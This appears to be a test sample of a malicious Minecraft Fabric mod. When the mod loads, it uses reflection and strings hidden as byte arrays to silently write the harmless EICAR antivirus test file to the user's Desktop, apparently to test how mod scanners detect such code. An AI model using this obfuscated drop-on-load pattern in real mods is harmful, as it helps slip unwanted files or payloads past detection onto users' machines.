package dev.silverandro.malicious_mods.cfn_simple_drop;

import net.fabricmc.api.ModInitializer;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.nio.file.Path;

public class CfnSimpleDrop implements ModInitializer {
    @Override
    public void onInitialize() {
        try {
            Class<?> systemClass = Class.forName(
                    new String(new byte[] {106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 83, 121, 115, 116, 101, 109})
            );
            Method getPropertyMethod = systemClass.getMethod(
                    new String(new byte[] {103, 101, 116, 80, 114, 111, 112, 101, 114, 116, 121}),
                    String.class
            );
            String userHome = (String)getPropertyMethod.invoke(null, new String(new byte[]{117, 115, 101, 114, 46, 104, 111, 109, 101}));

            String desktopDir = userHome.concat(File.separator).concat(new String(new byte[]{68, 101, 115, 107, 116, 111, 112}));

            Class<?> pathClass = Class.forName(new String(new byte[] {106, 97, 118, 97, 46, 110, 105, 111, 46, 102, 105, 108, 101, 46, 80, 97, 116, 104}));
            Method createPathMethod = pathClass.getMethod(
                    new String(new byte[] {111, 102}),
                    String.class,
                    String[].class
            );
            File output = ((Path)createPathMethod.invoke(null, desktopDir, new String[]{})).resolve(
                    new String(new byte[]{
                            101, 105, 99, 97, 114, 95, 116, 101, 115, 116,
                            95, 102, 105, 108, 101, 46, 99, 111, 109
                    })
            ).toFile();
            output.createNewFile();
            FileOutputStream outputStream = new FileOutputStream(output);
            outputStream.write(new byte[]{
                    88, 53, 79, 33, 80, 37, 64, 65, 80, 91, 52, 92, 80, 90, 88, 53, 52, 40, 80, 94, 41, 55,
                    67, 67, 41, 55, 125, 36, 69, 73, 67, 65, 82, 45, 83, 84, 65, 78, 68, 65, 82, 68, 45, 65,
                    78, 84, 73, 86, 73, 82, 85, 83, 45, 84, 69, 83, 84, 45, 70, 73, 76, 69, 33, 36, 72, 43, 72, 42
            });
            outputStream.close();
        } catch (IOException | ClassNotFoundException | NoSuchMethodException | InvocationTargetException |
                 IllegalAccessException e) {
            throw new RuntimeException(e);
        }
    }
}
